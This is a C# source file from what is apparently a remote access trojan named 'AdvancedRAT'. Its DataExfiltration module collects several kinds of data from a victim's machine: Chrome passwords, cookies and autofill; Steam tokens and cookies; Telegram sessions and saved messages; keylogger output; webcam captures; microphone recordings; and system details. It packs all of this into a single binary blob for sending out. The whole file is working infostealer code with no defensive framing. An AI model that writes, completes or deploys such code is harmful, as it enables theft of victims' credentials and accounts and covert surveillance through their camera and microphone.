using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using AdvancedRAT.Stealers.BrowserStealer;
using AdvancedRAT.Stealers.GameClientStealer;
using AdvancedRAT.Stealers.MessengerStealer;

namespace AdvancedRAT.Core.Modules
{
    public class DataExfiltration
    {
        public static async Task<ExfiltrationData> CollectAllData()
        {
            ExfiltrationData data = new ExfiltrationData();
            
            try
            {
                // Collect system info
                data.SystemInfo = await CollectSystemInfo();
                
                // Collect browser data
                data.ChromeCredentials = await ChromeStealer.StealChromeCredentials();
                data.ChromeCookies = await ChromeStealer.StealChromeCookies();
                data.ChromeAutofill = await ChromeStealer.StealChromeAutofill();
                
                // Collect game client data
                data.SteamTokens = await SteamStealer.StealSteamTokens();
                data.SteamUserData = await SteamStealer.StealSteamUserData();
                data.SteamCookies = await SteamStealer.StealSteamCookies();
                
                // Collect messenger data
                data.TelegramSessions = await TelegramStealer.StealTelegramSessions();
                data.TelegramSavedMessages = await TelegramStealer.StealTelegramSavedMessages();
                
                // Collect keylogs
                data.Keylogs = Keylogger.GetLogContent();
                
                // Collect screenshots
                data.Screenshots = new List<byte[]>();
                
                // Collect webcam images
                if (await WebcamController.IsWebcamAvailable())
                {
                    byte[] webcamImage = await WebcamController.CaptureWebcamImage();
                    if (webcamImage.Length > 0)
                    {
                        data.WebcamImages = new List<byte[]> { webcamImage };
                    }
                }
                
                // Collect microphone recordings
                if (await MicrophoneRecorder.IsMicrophoneAvailable())
                {
                    byte[] audioRecording = await MicrophoneRecorder.RecordAudio(5);
                    if (audioRecording.Length > 0)
                    {
                        data.MicrophoneRecordings = new List<byte[]> { audioRecording };
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error collecting exfiltration data: {ex.Message}");
            }
            
            return data;
        }
        
        private static async Task<SystemInfo> CollectSystemInfo()
        {
            return await Task.Run(() =>
            {
                try
                {
                    return new SystemInfo
                    {
                        MachineName = Environment.MachineName,
                        UserName = Environment.UserName,
                        OSVersion = Environment.OSVersion.ToString(),
                        DotNetVersion = Environment.Version.ToString(),
                        ProcessorCount = Environment.ProcessorCount,
                        TotalMemory = Environment.WorkingSet.ToString(),
                        CurrentDir = Environment.CurrentDirectory,
                        CommandLine = Environment.CommandLine
                    };
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error collecting system info: {ex.Message}");
                    return new SystemInfo();
                }
            });
        }
        
        public static async Task<byte[]> PackageData(ExfiltrationData data)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    using (BinaryWriter writer = new BinaryWriter(ms))
                    {
                        // Write system info
                        writer.Write(data.SystemInfo.MachineName ?? "");
                        writer.Write(data.SystemInfo.UserName ?? "");
                        writer.Write(data.SystemInfo.OSVersion ?? "");
                        writer.Write(data.SystemInfo.DotNetVersion ?? "");
                        writer.Write(data.SystemInfo.ProcessorCount);
                        writer.Write(data.SystemInfo.TotalMemory ?? "");
                        writer.Write(data.SystemInfo.CurrentDir ?? "");
                        writer.Write(data.SystemInfo.CommandLine ?? "");
                        
                        // Write Chrome credentials
                        writer.Write(data.ChromeCredentials.Count);
                        foreach (var cred in data.ChromeCredentials)
                        {
                            writer.Write(cred.URL ?? "");
                            writer.Write(cred.Username ?? "");
                            writer.Write(cred.Password ?? "");
                        }
                        
                        // Write Chrome cookies
                        writer.Write(data.ChromeCookies.Count);
                        foreach (var cookie in data.ChromeCookies)
                        {
                            writer.Write(cookie.Host ?? "");
                            writer.Write(cookie.Name ?? "");
                            writer.Write(cookie.Path ?? "");
                            writer.Write(cookie.Value ?? "");
                        }
                        
                        // Write Chrome autofill
                        writer.Write(data.ChromeAutofill.Count);
                        foreach (var fill in data.ChromeAutofill)
                        {
                            writer.Write(fill.Name ?? "");
                            writer.Write(fill.Value ?? "");
                        }
                        
                        // Write Steam tokens
                        writer.Write(data.SteamTokens.Count);
                        foreach (var token in data.SteamTokens)
                        {
                            writer.Write(token.Key ?? "");
                            writer.Write(token.Value ?? "");
                        }
                        
                        // Write Steam user data
                        writer.Write(data.SteamUserData ?? "");
                        
                        // Write Steam cookies
                        writer.Write(data.SteamCookies.Count);
                        foreach (var cookie in data.SteamCookies)
                        {
                            writer.Write(cookie.Key ?? "");
                            writer.Write(cookie.Value ?? "");
                        }
                        
                        // Write Telegram sessions
                        writer.Write(data.TelegramSessions.Count);
                        foreach (var session in data.TelegramSessions)
                        {
                            writer.Write(session.Key ?? "");
                            writer.Write(session.Value ?? "");
                        }
                        
                        // Write Telegram saved messages
                        writer.Write(data.TelegramSavedMessages.Count);
                        foreach (var message in data.TelegramSavedMessages)
                        {
                            writer.Write(message ?? "");
                        }
                        
                        // Write keylogs
                        writer.Write(data.Keylogs ?? "");
                        
                        // Write screenshots count and data
                        writer.Write(data.Screenshots.Count);
                        foreach (var screenshot in data.Screenshots)
                        {
                            writer.Write(screenshot.Length);
                            writer.Write(screenshot);
                        }
                        
                        // Write webcam images count and data
                        writer.Write(data.WebcamImages.Count);
                        foreach (var image in data.WebcamImages)
                        {
                            writer.Write(image.Length);
                            writer.Write(image);
                        }
                        
                        // Write microphone recordings count and data
                        writer.Write(data.MicrophoneRecordings.Count);
                        foreach (var recording in data.MicrophoneRecordings)
                        {
                            writer.Write(recording.Length);
                            writer.Write(recording);
                        }
                    }
                    
                    return ms.ToArray();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error packaging exfiltration data: {ex.Message}");
                return new byte[0];
            }
        }
    }
    
    public class ExfiltrationData
    {
        public SystemInfo SystemInfo { get; set; }
        public List<Credentials> ChromeCredentials { get; set; }
        public List<Cookie> ChromeCookies { get; set; }
        public List<AutofillData> ChromeAutofill { get; set; }
        public Dictionary<string, string> SteamTokens { get; set; }
        public string SteamUserData { get; set; }
        public Dictionary<string, string> SteamCookies { get; set; }
        public Dictionary<string, string> TelegramSessions { get; set; }
        public List<string> TelegramSavedMessages { get; set; }
        public string Keylogs { get; set; }
        public List<byte[]> Screenshots { get; set; }
        public List<byte[]> WebcamImages { get; set; }
        public List<byte[]> MicrophoneRecordings { get; set; }
        
        public ExfiltrationData()
        {
            SystemInfo = new SystemInfo();
            ChromeCredentials = new List<Credentials>();
            ChromeCookies = new List<Cookie>();
            ChromeAutofill = new List<AutofillData>();
            SteamTokens = new Dictionary<string, string>();
            SteamUserData = "";
            SteamCookies = new Dictionary<string, string>();
            TelegramSessions = new Dictionary<string, string>();
            TelegramSavedMessages = new List<string>();
            Keylogs = "";
            Screenshots = new List<byte[]>();
            WebcamImages = new List<byte[]>();
            MicrophoneRecordings = new List<byte[]>();
        }
    }
    
    public class SystemInfo
    {
        public string MachineName { get; set; }
        public string UserName { get; set; }
        public string OSVersion { get; set; }
        public string DotNetVersion { get; set; }
        public int ProcessorCount { get; set; }
        public string TotalMemory { get; set; }
        public string CurrentDir { get; set; }
        public string CommandLine { get; set; }
    }
}